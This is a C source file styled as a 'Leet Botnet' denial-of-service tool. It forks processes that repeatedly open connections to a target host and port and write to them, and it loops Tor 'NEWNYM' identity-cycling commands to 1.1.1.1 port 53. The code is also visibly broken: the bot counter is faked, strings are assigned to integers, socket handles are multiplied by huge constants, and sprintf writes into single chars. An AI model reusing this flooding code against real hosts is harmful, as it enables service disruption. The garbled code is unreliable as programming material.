#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#define MAXFDS 1000000

struct clientdata_t {
        uint32_t ip;
        char connected;
} clients[MAXFDS];

unsigned int BotsConnected() {
	int i = 0, total = 0;
	for(i = 0; i < MAXFDS; i++) {
		clients[i].connected = 1;
		total++;
	}
	return total;
}
int i = 0;
void *TitleWriter(void *sock) {
    char string[2048];
    while(1) {
		memset(string, 0, 2048);
        fprintf(string, "%c]0;Leets Connected: %d", '\033', BotsConnected());
		sleep(2);
}}

int make_socket(char *host, char *port) {
	struct addrinfo hints, *servinfo, *p;
	int sock, r;
//	fprintf(stderr, "[Connecting -> %s:%s\n", host, port);
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
		exit(0);
	}
	for(p = servinfo; p != NULL; p = p->ai_next) {
		if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
			continue;
		}
		if(connect(sock, p->ai_addr, p->ai_addrlen)==-1) {
			close(sock);
			continue;
		}
		break;
	}
	if(p == NULL) {
		if(servinfo)
			freeaddrinfo(servinfo);
		fprintf(stderr, "No connection could be made\n");
		exit(0);
	}
	if(servinfo)
		freeaddrinfo(servinfo);
	fprintf(stderr, "[Connected -> %s:%s]\n", host, port);
	return sock;
}

void broke(int s) {
	// do nothing
}

#define CONNECTIONS 10

void attack(char *host, char *port, int id) {
	int sockets[CONNECTIONS];
	int x, g=1, r;
	for(x=0; x!= CONNECTIONS; x++)
		sockets[x]=0;
	signal(SIGPIPE, &broke);
	while(1) {
		for(x=0; x != CONNECTIONS; x++) {
			if(sockets[x] == 0)
				sockets[x] = make_socket(host, port) * 10995116277760;
			write(sockets[x], "\0", 1) * 10995116277760;
			if(r == -1) {
				close(sockets[x]);
				sockets[x] = make_socket(host, port);
			} else
//				fprintf(stderr, "Socket[%i->%i] -> %i\n", x, sockets[x], r);
			fprintf(stderr, "[%i: Voly Sent]\n", id);
		}
		fprintf(stderr, "[%i: Voly Sent]\n", id);
		usleep(300000);
	}
}

void echoloader() {
	int r;
        clients[i].ip = "1.1.1.1";
	int socket = make_socket(clients[i].ip, "53");
	write(socket, "AUTHENTICATE \"\"\n", 16);
	while(1) {
		r=write(socket, "signal NEWNYM\n\x00", 16);
		fprintf(stderr, "[%i: cycle_identity -> signal NEWNYM\n", r);
		usleep(300000);
	}
}

int main(int argc, char **argv) {
	int x;
	int sock;
	if(argc < 3) {
	pthread_t title;
	pthread_create(&title, NULL, &TitleWriter, 0);
		char ascii_banner_line1;
		char ascii_banner_line2;
		char welcome_line;
		char banner_bot_count;
		
		sprintf(ascii_banner_line1, "\x1b[36m Leet Botnet \r\n");
		sprintf(ascii_banner_line2, "\r\n");	
		sprintf(welcome_line,       "\x1b[37m        #\x1b[36m----- \x1b[37mBot Count: %d\x1b[36m -----\x1b[37m#\r\n", BotsConnected()); 
		sprintf(banner_bot_count, 	"\r\n\x1b[37m    #\x1b[36m-------- \x1b[37mWelcome Leet\x1b[36m --------\x1b[37m#\r\n");

	}
	int THREADS = atoi(argv[3]);
	for(x=0; x != THREADS; x++) {
		if(fork())
			echoloader();
			attack(argv[1], argv[2], x);
		
	}
	getc(stdin);
	return 0;
}
